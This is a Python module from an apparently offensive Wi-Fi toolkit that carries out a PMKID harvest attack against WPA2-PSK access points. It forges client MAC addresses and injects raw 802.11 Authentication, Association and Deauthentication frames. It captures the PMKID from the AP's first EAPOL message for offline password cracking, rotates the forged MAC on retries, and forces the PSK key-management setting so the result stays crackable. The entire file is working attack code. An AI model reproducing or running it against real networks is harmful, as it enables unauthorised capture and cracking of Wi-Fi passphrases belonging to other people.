"""PMKID harvest attack (hcxdumptool-style, native).

Sequence per attempt:
    1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
    2. Listen briefly for Auth Resp (status=0 means the AP will engage).
    3. Inject Assoc Req carrying the AP's exact RSN IE + SSID + rates.
    4. Wait for the AP's EAPOL M1 — many WPA2-PSK APs ship a PMKID KDE in
       the Key Data. The existing frame parser surfaces it as
       ``parsed['eapol_pmkid']`` and the WlanInterface populates
       ``AP.handshakes[source].pmkid`` for free.
    5. Deauth the AP and stop the moment M1 arrives. M1 is terminal: we can't
       send M2 (no PSK for its MIC), so a PMKID-less M1 means this AP exposes
       none — give up rather than retry the same empty M1 — and even on success
       the deauth frees the AP from retransmitting M1 for ~5 s. We only rotate
       the MAC and retry when the AP stays *silent* (a lost Auth/Assoc).

The attack returns the harvested 16-byte PMKID, or ``None`` if the AP answers
with a PMKID-less M1 (or never answers). Cracker-side, the existing
``engine/hc22000.write_hc22000`` writes a ``WPA*01*…`` hashline whenever
``hs.pmkid`` is set.
"""

from __future__ import annotations

import asyncio
import logging
import os
import struct
import time
from typing import Optional

from wifit3.engine.models import AccessPoint

logger = logging.getLogger(__name__)


def _mac_bytes_to_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


# Standard supported rates IE (tag 1). Basic-rate bit (0x80) on the b/g
# mandatory rates. Encoded in 500 kbps units. The exact menu doesn't
# matter much — APs only check it's well-formed.
_SUPPORTED_RATES = bytes([
    0x82, 0x84, 0x8B, 0x96,         # 1, 2, 5.5, 11 (basic)
    0x0C, 0x12, 0x18, 0x24,         # 6, 9, 12, 18
])
_EXT_SUPPORTED_RATES = bytes([
    0x30, 0x48, 0x60, 0x6C,         # 24, 36, 48, 54
])

# Generic WPA2-PSK-CCMP RSN IE used when the AP's own IE is unavailable.
# Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
_GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")

# 00-0F-AC:2 (PSK). Our forged Assoc negotiates PSK, so any PMKID the AP returns
# is PSK-derived (crackable) — we assert it so the AKM crackability gate doesn't
# suppress a harvest on a WPA3-transition AP whose beacon also advertises SAE.
_AKM_PSK = 0x02


def _str_to_mac(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast bit clear)."""
    rnd = os.urandom(5)
    return bytes([0x02]) + rnd


class PmkidHarvestAttack:
    """Run a PMKID harvest against a single AP."""

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        # Set by run() on failure to the specific cause (PMF / PMKID-less M1 /
        # silent), so the UI reports why instead of guessing.
        self.fail_reason: Optional[str] = None
        # Register with the interface so client/handshake registration
        # ignores these MACs (they're not real clients).
        self.iface.register_forged_mac(self.source_mac)

    def _rotate_mac(self) -> None:
        self.source_mac = _random_client_mac()
        self.iface.register_forged_mac(self.source_mac)

    # ---- Frame builders -----------------------------------------------------

    def _build_auth_req(self) -> bytes:
        """802.11 Authentication Request (Open System, seq=1)."""
        # FC: type=mgmt(0), subtype=auth(0x0B) → 0xB0
        mac_hdr = (
            b"\xb0\x00"                         # FC
            + b"\x00\x00"                       # Duration
            + self.bssid_bytes                  # Addr1 = BSSID (dest)
            + self.source_mac                   # Addr2 = us (source)
            + self.bssid_bytes                  # Addr3 = BSSID
            + b"\x00\x00"                       # Seq (hardware fills)
        )
        # Auth body: algo=0 (Open), seq=1, status=0
        body = b"\x00\x00" + b"\x01\x00" + b"\x00\x00"
        return mac_hdr + body

    def _build_assoc_req(self) -> bytes:
        """802.11 Association Request carrying SSID + rates + RSN IE."""
        # FC: type=mgmt(0), subtype=assoc_req(0x00) → 0x00
        mac_hdr = (
            b"\x00\x00"
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        # Capability Info (2B LE) — ESS + Privacy.
        cap_info = struct.pack("<H", 0x0011)
        # Listen interval (2B LE).
        listen_int = struct.pack("<H", 0x0001)

        # Tag 0: SSID. We tolerate hidden / unknown SSIDs by sending zero-length
        # — the AP should still respond on its BSSID. Most APs require the
        # real SSID though, so prefer it if we have one.
        ssid = (self.target.ssid or "").encode("utf-8", errors="ignore")[:32]
        ssid_ie = bytes([0x00, len(ssid)]) + ssid

        # Tag 1: Supported Rates
        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
        # Tag 50: Extended Supported Rates
        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES

        # Tag 48: RSN IE — echo the AP's exact bytes if we have them, else
        # fall back to a generic WPA2-PSK-CCMP IE.
        rsn_ie = self.target.rsn_ie or _GENERIC_RSN_IE

        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + rsn_ie
        return mac_hdr + body

    def _build_deauth(self) -> bytes:
        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to
        the AP. Addr1=BSSID (dest), Addr2=us, Addr3=BSSID."""
        # FC: type=mgmt(0), subtype=deauth(0x0C) → 0xC0
        mac_hdr = (
            b"\xc0\x00"
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        return mac_hdr + struct.pack("<H", 3)   # reason 3 = STA leaving

    # ---- Driver -------------------------------------------------------------

    def _received_m1(self):
        """The parser-created Handshake for our forged MAC on this AP once its M1
        (EAPOL-Key msg 1) lands — present the moment M1 arrives, with or without a
        PMKID; None until then. M1 is terminal for us: we can't compute M2's MIC
        without the PSK, so a PMKID-less M1 means this AP simply doesn't expose one
        (retrying the same AP would only re-fetch the same empty M1)."""
        ap_state = self.iface.access_points.get(self.target.bssid.lower())
        if not ap_state:
            return None
        return ap_state.handshakes.get(_mac_bytes_to_str(self.source_mac))

    async def _send_leaving_deauth(self, count: int = 3) -> None:
        """Deauth the AP (×count) the instant we have M1 — we never send M2, so
        otherwise the AP retransmits M1 for ~5 s waiting for it. PMKID harvest runs
        without active-monitor (a one-shot, so our TX is un-ACKed); a single deauth
        could drop unnoticed, so send a small burst so 'we're leaving' lands."""
        frame = self._build_deauth()
        for _ in range(count):
            await self.iface.send_raw(frame, use_no_ack=True)
            await asyncio.sleep(0.003)

    async def run(
        self,
        attempts: int = 3,
        m1_timeout: float = 2.0,
    ) -> Optional[bytes]:
        """Try up to ``attempts`` association rounds. Returns the 16-byte PMKID on
        success, else None.

        Receiving M1 is terminal: we deauth (we can never answer with M2) and stop
        — with the PMKID on success, or empty-handed if this AP ships a PMKID-less
        M1 (no point retrying the same AP). We only rotate the MAC and retry when
        the AP stays *silent* (a lost Auth/Assoc in the pre-M1 dance). On any
        failure ``self.fail_reason`` carries the specific cause for the UI."""
        self.fail_reason = None

        # PMF Required: the AP only associates protected (802.11w) clients, so our
        # unprotected Auth/Assoc is ignored — no M1, no PMKID. Don't waste the air.
        if self.target.pmf_required:
            self.fail_reason = (
                "PMF Required — the AP only talks to protected (802.11w) clients; "
                "our unprotected association is ignored, so there's no M1 to read a "
                "PMKID from"
            )
            logger.info("[PMKID] %s is PMF-Required — unharvestable, skipping.",
                        self.target.bssid)
            return None

        # Make sure we're on the AP's channel — Focus already tunes here,
        # but be defensive.
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        for attempt in range(1, attempts + 1):
            logger.info(
                f"[PMKID] Attempt {attempt}/{attempts}: Auth + Assoc Req to "
                f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
            )
            await self.iface.send_raw(self._build_auth_req(), use_no_ack=True)
            # Tiny pause so the AP processes the Auth before the Assoc lands.
            await asyncio.sleep(0.1)
            await self.iface.send_raw(self._build_assoc_req(), use_no_ack=True)

            # Poll the parser-populated handshake dict for our forged MAC's M1.
            deadline = time.time() + m1_timeout
            while time.time() < deadline:
                hs = self._received_m1()
                if hs is not None:
                    # M1 in hand — terminal. Free the air before we leave.
                    await self._send_leaving_deauth()
                    if hs.pmkid:
                        if hs.akm_client is None:
                            hs.akm_client = _AKM_PSK   # we negotiated PSK in our Assoc
                        logger.info(
                            f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                            f"(STA {_mac_bytes_to_str(self.source_mac)})"
                        )
                        return hs.pmkid
                    self.fail_reason = (
                        "the AP answered with an M1 but no PMKID KDE — it doesn't "
                        "expose one (retrying the same AP won't help)"
                    )
                    logger.info(
                        f"[PMKID] {self.target.bssid} answered with a PMKID-less M1 — "
                        f"this AP doesn't expose one; not retrying."
                    )
                    return None
                await asyncio.sleep(0.05)

            logger.info(
                f"[PMKID] Attempt {attempt}: no M1 (AP silent) — rotating MAC and retrying."
            )
            self._rotate_mac()

        # Exhausted every attempt without a single M1.
        if self.target.pmf_capable:
            self.fail_reason = ("no M1 — the AP is PMF-capable and may be dropping "
                                "our (non-PMF) association")
        else:
            self.fail_reason = ("no M1 — the AP never answered our Auth/Assoc "
                                "(out of range, busy, or refused)")
        return None
